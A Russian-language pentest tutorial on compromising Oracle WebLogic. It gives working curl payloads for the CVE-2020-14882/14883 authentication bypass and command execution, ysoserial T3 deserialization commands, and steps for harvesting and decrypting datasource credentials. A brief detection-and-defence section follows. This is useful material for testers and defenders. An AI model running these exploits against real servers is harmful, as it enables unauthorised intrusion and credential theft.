## Вопрос, с которого всё начинается

В подсети висит сервер на порту 7001. Браузер открывает страницу входа «Oracle WebLogic Server Administration Console». Пароля нет, но это и не нужно: у WebLogic есть два независимых пути к выполнению кода **без аутентификации** — через собственный протокол T3 и через обход пути в консоли. Разберём оба.

## Что такое WebLogic и почему он опасен

WebLogic — это **сервер приложений** на Java: контейнер, в котором крутятся корпоративные Java-приложения (J2EE). Через него работают банки, телеком, госсервисы. Администрируется он через консоль на порту 7001, а приложения общаются с ним по протоколам **T3** и **IIOP** — это бинарные Java-протоколы для удалённых вызовов.

Опасность в том, что T3/IIOP **принимают сериализованные Java-объекты** от клиента. Сериализация — это превращение объекта в поток байтов, чтобы передать его по сети. WebLogic десериализует этот поток, чтобы восстановить объект. Если атакующий подсунет не обычный объект, а **цепочку гаджетов** (классов, которые при десериализации выполняют код), он добьётся RCE. Это и есть класс **десериализационных** уязвимостей.

Второй путь — **CVE-2020-14882**: обход авторизации в консоли. Патч закрыл его, но непропатченные серверы открыты.

## Наш пример: WebLogic 12.2.1.3

Цель — `https://weblogic.target.example:7001`. Определяем версию по странице входа:

```
$ curl -s https://weblogic.target.example:7001/console/login/LoginForm.jsp | grep -i 'WebLogic Server Version'
<META NAME="WebLogic Server Version" CONTENT="12.2.1.3.0">
```

Версия **12.2.1.3.0** — попадает и в CVE-2020-14882 (10.3.6.0 – 12.2.1.4.0), и в CVE-2020-14883 (та же консоль, но другой handle). Идём по самому простому пути — обход консоли.

## Шаг 1: обход авторизации через двойное кодирование

Консоль WebLogic проверяет путь до его нормализации. Если закодировать `../` дважды, фильтр увидит безобидный путь, а сервер после декодирования уйдёт выше — в защищённый раздел `/console/`.

```
$ curl -s -o /dev/null -w '%{http_code}\n' \
  'https://weblogic.target.example:7001/console/css/%252e%252e%252fconsole.portal'
200
```

Ответ `200` вместо `302` (редирект на логин) означает: авторизацию обошли. Теперь можно запросить `console.portal` с параметрами, которые выполняют действие от имени администратора.

## Шаг 2: выполнение команды через console.portal

CVE-2020-14883 позволяет через тот же обход передать `handle` с ссылкой на произвольный Java-класс. Классический payload:

```
$ curl -s 'https://weblogic.target.example:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27id%27)%22)'
```

Сервер выполняет `id` и возвращает вывод. Если MVEL-обработчик недоступен, используют второй вариант — загрузку XML-файла с `FileSystemXmlApplicationContext`. Оба варианта дают RCE без единой попытки входа.

## Шаг 3: второй путь — T3-десериализация

Обход консоли могут закрыть патчем, но T3 часто остаётся открыт. T3 — это бинарный протокол; клиент шлёт заголовок рукопожатия, затем сериализованный объект. Если WebLogic десериализует его без фильтра классов, применяют цепочку гаджетов (например, CommonsCollections).

Проверка неразрушающая: отправляем сериализованный объект, который лишь выполняет `sleep` — если ответ задерживается, десериализация «сработала». Полноценный эксплойт — через `ysoserial`:

```
$ java -jar ysoserial.jar CommonsCollections6 'id' > payload.ser
$ python3 t3send.py weblogic.target.example 7001 payload.ser
```

Инструмент `t3send.py` реализует T3-рукопожатие и отправляет сериализованный объект. Если версия и фильтр позволяют — получаем вывод команды.

## Шаг 4: закрепление и сбор кред

Получив RCE, первым делом читаем конфиги. WebLogic хранит пароли к datasource в `config/config.xml` и в `boot.properties`; их можно расшифровать через сам WebLogic (класс `weblogic.security.internal.SerializedSystemIni`). Найденные креды открывают базы и другие сервисы. Так appliance превращается в набор доступов.

## Шаг 5: что делать, если оба вектора закрыты

Если и консоль пропатчена, и T3 закрыт фильтром классов — не сдавайся. Проверь IIOP (порт 7001 и RMI), сервлеты приложений, `/wls-wsat/` (если старый). WebLogic — огромная поверхность, и версия 12.2.1.3 имеет ещё десяток CVE. Но всегда начинай с pre-auth путей: они самые дешёвые.

## Что мы теперь знаем

- WebLogic — Java-сервер приложений с бинарными протоколами T3/IIOP.
- Десериализация T3/IIOP → цепочка гаджетов → RCE.
- CVE-2020-14882 — обход авторизации через двойное URL-кодирование.
- Оба вектора — pre-auth, поэтому WebLogic так ценен.
- После RCE — конфиги с паролями к datasource.

## Разбираем T3 глубже

T3 — это не «магия», а конкретный протокол с понятной структурой. Клиент открывает TCP-соединение на порт 7001 и посылает **заголовок рукопожатия** — четыре байта, задающие версию протокола, за ними — сериализованный Java-объект. Сервер отвечает своим объектом. Дальше начинается обычный обмен.

Важно вот что: и запрос, и ответ — это **Java-сериализация**. То есть сервер по определению десериализует то, что прислал клиент. Если бы у него был строгий белый список классов — проблемы бы не было. Но исторически у WebLogic его не было, поэтому любой класс из classpath можно было «попросить» восстановить.

Проверить, жив ли T3, можно вручную, без эксплойта:

```
$ python3 -c "
import socket
s = socket.create_connection(('weblogic.target.example', 7001), timeout=5)
s.send(bytes.fromhex('743132300000'))   # T3 header
print(s.recv(64).hex())
s.close()"
4a524d4900000000...
```

Ответ начинается с `4a524d49` — это ASCII `JRMI`, признак Java RMI/T3. Если порт отвечает так, T3 открыт.

## Цепочки гаджетов: почему работает ysoserial

**Гаджет** — это класс, который в процессе своего «восстановления» (или при уничтожении объекта) выполняет полезное для атакующего действие. Обычно это вызов метода, чтение файла или запуск процесса. Цепочка гаджетов — это несколько классов, связанных так, что десериализация одного тянет другой и в итоге приводит к `Runtime.exec`.

`ysoserial` — генератор таких цепочек. Ты даёшь ему имя цепочки и команду, он отдаёт готовый сериализованный объект:

```
$ java -jar ysoserial.jar CommonsCollections5 'touch /tmp/pwned' > c5.ser
$ java -jar ysoserial.jar JRMPClient 'weblogic.target.example:1099' > jrmp.ser
```

Цепочка выбирается по тому, какие библиотеки есть на сервере. `CommonsCollections` есть почти везде (её тянет сам WebLogic), поэтому её пробуют первой. Если не сработала — `CommonsBeanutils1`, `Jdk7u21`, `Groovy1`.

## Что такое IIOP и чем он отличается от T3

IIOP — это протокол CORBA поверх TCP, тоже поддерживаемый WebLogic. Он используется для взаимодействия Java-приложений с не-Java системами. Для атакующего важно, что IIOP тоже десериализует объекты, и есть цепочки специально под него. Часто IIOP слушают на том же 7001 или на отдельном порту.

Проверка: подключиться и посмотреть, отвечает ли сервер CORBA-сообщением. Если да — можно пробовать `weblogic.iiop` эксплойты.

## wls-wsat: старый, но живой вектор

В старых версиях (10.3.x) был компонент **wls-wsat** — веб-сервисы, принимающие SOAP. Через него тоже была десериализация:

```
$ curl -s 'http://weblogic.target.example:7001/wls-wsat/CoordinatorPortType' \
  -H 'Content-Type: text/xml' --data-binary @soap-payload.xml
```

Патч закрыл его в новых версиях, но на legacy-серверах он встречается. Всегда проверяй `/wls-wsat/` — если отвечает `200`, стоит попробовать.

## Если фильтр классов закрыл десериализацию

Современные версии имеют **фильтр десериализации**, отсекающий опасные классы. Но фильтры обходят:

- Через **классы из белого списка**, которые всё равно приводят к выполнению (например, `java.util.PriorityQueue` в связке с другими).
- Через **JNDI-инъекцию** (как в Log4Shell): заставить сервер подключиться к твоему LDAP и загрузить класс.
- Через **новые цепочки** — сообщество постоянно находит обходы для конкретных версий.

Поэтому «патченный» WebLogic — не значит «безопасный». Проверяй версию и наличие свежих CVE.

## Как это выглядит в реальной атаке

В реальном пентесте ты редко «сразу стреляешь». Порядок такой: обнаружить порт 7001 (`nmap -p7001`), открыть консоль, определить версию, поискать CVE по версии, взять публичный PoC, прочитать его (чтобы не запустить чужой бэкдор), адаптировать callback на свой хост, проверить неразрушающим запросом, и только потом эксплуатировать.

Частая ошибка новичка — запустить найденный PoC «как есть», не прочитав. Публичные эксплойты иногда содержат чужой код, который стучится на незнакомый сервер. Всегда читай и перенаправляй всё на себя.

## Детект и защита (взгляд синей команды)

Синяя команда ловит атаку на WebLogic по: запросам к `/console/css/%252e%252e%252f` (двойное кодирование в логах), T3-соединениям с необычными сериализованными объектами, запуску `java -jar ysoserial` на хостах атакующего. Защита: закрыть T3/IIOP, если они не нужны; обновить версию; включить фильтр десериализации; ограничить доступ к порту 7001.

## Практический чек-лист по WebLogic

Соберём порядок действий в одну шпаргалку, чтобы не потеряться:

1. `nmap -p7001,7002,5556 <host>` — найти консоль и T3/IIOP.
2. `curl -s http://<host>:7001/console/login/LoginForm.jsp | grep -i version` — версия.
3. Сопоставить версию с CVE (14882/14883 — консоль, 2725 — wls-wsat, 2628 — T3).
4. Взять публичный PoC, **прочитать его целиком**, убрать чужие callback-адреса.
5. Неразрушающая проверка: `/console/css/%252e%252e%252fconsole.portal` → код `200`.
6. Эксплуатация: `id` вместо `rm`; никаких изменений на диске.
7. Пост-эксплуатация: `config/config.xml`, `boot.properties`, datasource.
8. Зафиксировать: запрос + ответ + версия + CVE.

Шаг 5 — самый важный для отчёта: он доказывает обход авторизации одной строкой и ничего не ломает.
